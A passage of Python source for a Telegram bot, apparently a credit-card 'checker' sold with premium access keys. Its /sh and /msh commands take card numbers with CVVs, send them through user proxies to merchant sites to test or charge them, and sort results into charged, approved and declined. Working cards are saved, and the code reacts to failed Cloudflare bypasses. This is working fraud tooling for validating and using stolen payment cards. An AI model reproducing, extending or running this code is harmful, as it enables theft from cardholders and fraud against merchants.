        try: await client.send_message(user_id, f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 5000 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
        except: pass
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙤𝙧 𝙙𝙖𝙮𝙨!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data: return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮!")
        if keys_data[key]['used']: return await event.reply("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!")
        if await is_premium_user(event.sender_id): return await event.reply("❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        await event.reply(f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 5000 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com")
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added_sites = []
        already_exists = []
        for site in sites_to_add:
            if site in user_sites: already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if added_sites: response_parts.append("\n".join(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {s}" for s in added_sites))
        if already_exists: response_parts.append("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists))
        if response_parts: await event.reply("\n\n".join(response_parts))
        else: await event.reply("❌ 𝙉𝙤 𝙣𝙚𝙬 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else: not_found_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if removed_sites: response_parts.append("\n".join(f"✅ 𝙍𝙚𝙢𝙤𝙫𝙚𝙙: {s}" for s in removed_sites))
        if not_found_sites: response_parts.append("\n".join(f"❌ 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙: {s}" for s in not_found_sites))
        if response_parts: await event.reply("\n\n".join(response_parts))
        else: await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙬𝙚𝙧𝙚 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙩𝙤 𝙥𝙧𝙤𝙩𝙚𝙘𝙩 𝙮𝙤𝙪𝙧 𝙥𝙧𝙤𝙭𝙮!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /addpxy ip:port:username:password\n")
        
        proxy_str = parts[1].strip()
        proxy_data = parse_proxy_format(proxy_str)
        
        if not proxy_data:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙧𝙤𝙭𝙮 𝙛𝙤𝙧𝙢𝙖𝙩!\n\n𝙐𝙨𝙚: ip:port:username:password\n")
        
        # Check current proxy count
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        if len(user_proxies) >= 10:
            return await event.reply("❌ 𝙋𝙧𝙤𝙭𝙮 𝙇𝙞𝙢𝙞𝙩 𝙍𝙚𝙖𝙘𝙝𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙪𝙥 𝙩𝙤 10 𝙥𝙧𝙤𝙭𝙞𝙚𝙨.\n𝙐𝙨𝙚 /rmpxy 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙤𝙡𝙙 𝙤𝙣𝙚𝙨.")
        
        # Check if proxy already exists
        for existing_proxy in user_proxies:
            if existing_proxy['proxy_url'] == proxy_data['proxy_url']:
                return await event.reply("⚠️ 𝙏𝙝𝙞𝙨 𝙥𝙧𝙤𝙭𝙮 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙖𝙙𝙙𝙚𝙙!")
        
        # Test the proxy
        proxy_type_display = proxy_data.get('type', 'http').upper()
        testing_msg = await event.reply(f"🔄 𝙏𝙚𝙨𝙩𝙞𝙣𝙜 {proxy_type_display} 𝙥𝙧𝙤𝙭𝙮...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])
        
        if not is_working:
            await testing_msg.edit(f"❌ 𝙋𝙧𝙤𝙭𝙮 𝙞𝙨 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜!\n\n𝙀𝙧𝙧𝙤𝙧: {result}")
            return
        
        # Add the proxy to the list
        user_proxies.append(proxy_data)
        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
        
        auth_display = f"👤 {proxy_data['username']}" if proxy_data.get('username') else "🔓 No Auth"
        await testing_msg.edit(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙖𝙙𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!\n\n🌐 𝙀𝙭𝙩𝙚𝙧𝙣𝙖𝙡 𝙄𝙋: {result}\n📍 𝙋𝙧𝙤𝙭𝙮: {proxy_data['ip']}:{proxy_data['port']}\n🔐 𝙏𝙮𝙥𝙚: {proxy_type_display}\n{auth_display}\n📊 𝙏𝙤𝙩𝙖𝙡 𝙋𝙧𝙤𝙭𝙞𝙚𝙨: {len(user_proxies)}/10")
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!")
        
        parts = event.raw_text.split(maxsplit=1)
        
        # If no argument, show usage
        if len(parts) == 1:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rmpxy <index>\n𝙊𝙧: /rmpxy all\n\n𝙐𝙨𝙚 /proxy 𝙩𝙤 𝙨𝙚𝙚 𝙞𝙣𝙙𝙚𝙭 𝙣𝙪𝙢𝙗𝙚𝙧𝙨")
        
        arg = parts[1].strip().lower()
        
        # Remove all proxies
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(f"✅ 𝘼𝙡𝙡 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!")
        
        # Remove by index
        try:
            index = int(arg) - 1  # Convert to 0-based index
            
            if index < 0 or index >= len(user_proxies):
                return await event.reply(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 (1-{len(user_proxies)})")
            
            removed_proxy = user_proxies.pop(index)
            
            if user_proxies:
                proxies[str(event.sender_id)] = user_proxies
            else:
                del proxies[str(event.sender_id)]
            
            await save_json(PROXY_FILE, proxies)
            
            await event.reply(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(user_proxies)}")
            
        except ValueError:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙐𝙨𝙚: /rmpxy 1 𝙤𝙧 /rmpxy all")
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        user_proxies = await get_all_user_proxies(event.sender_id)
        
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!\n\n𝙐𝙨𝙚 /addpxy 𝙩𝙤 𝙖𝙙𝙙 𝙤𝙣𝙚.")
        
        # Build proxy list message
        proxy_list = f"📡 **𝙔𝙤𝙪𝙧 𝙋𝙧𝙤𝙭𝙞𝙚𝙨** ({len(user_proxies)}/10)\n\n"
        
        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_type = proxy_data.get('type', 'http').upper()
            auth_info = ""
            if proxy_data.get('username'):
                auth_info = f" | 👤 {proxy_data['username']}"
            
            proxy_list += f"`{idx}.` 🔐 {proxy_type} | 📍 {proxy_data['ip']}:{proxy_data['port']}{auth_info}\n"
        
        proxy_list += f"\n**ℹ️ 𝙄𝙣𝙛𝙤:**\n• Bot uses random proxy for each check\n• Dead proxies are auto-removed\n• Supports HTTP, HTTPS, SOCKS4, SOCKS5\n• Use `/rmpxy <index>` to remove specific proxy\n• Use `/rmpxy all` to remove all proxies"
        
        await event.reply(proxy_list)
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh(?:\s|$)'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 ⌁ 𝙍𝙚𝙫𝟯𝙧𝙨𝙚𝙭 <𝙊𝙛𝙛/𝙞𝙣𝙚>", buttons=buttons)
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    card = None
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card:
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /𝙨𝙝 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card:
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /sh 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /𝙖𝙙𝙙")
    loading_msg = await event.reply("🍳")
    start_time = time.time()
    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except: break
    loading_task = asyncio.create_task(animate_loading())
    try:
        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()
        
        # Check for charged status
        is_charged = False
        if "charged" in response_text or "charged" in status_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "cloudflare bypass failed" in response_text:
            status_header = " 𝙇𝙊𝙐     𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged: await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh(?:\s|$)'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    cards = []
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards:
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
    # Apply limit based on user type (admin has no limit)
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit:
        cards = cards[:user_limit]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙨𝙝.```")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪𝙧 𝘼𝙧𝙚𝙚 𝙣𝙤𝙩 𝘼𝙙𝙙𝙚𝙙 𝘼𝙣𝙮 𝙐𝙧𝙡 𝙁𝙞𝙧𝙨𝙩 𝘼𝙙𝙙 𝙐𝙧𝙡")
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    sent_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    cards_per_site = 2
    current_site_index = 0
    cards_on_current_site = 0

    batch_size = 10
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = []

        for card in batch:
            current_site = sites[current_site_index]
            tasks.append(check_card_specific_site(card, current_site, event.sender_id))
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(sites)
                cards_on_current_site = 0

        results = await asyncio.gather(*tasks, return_exceptions=True)

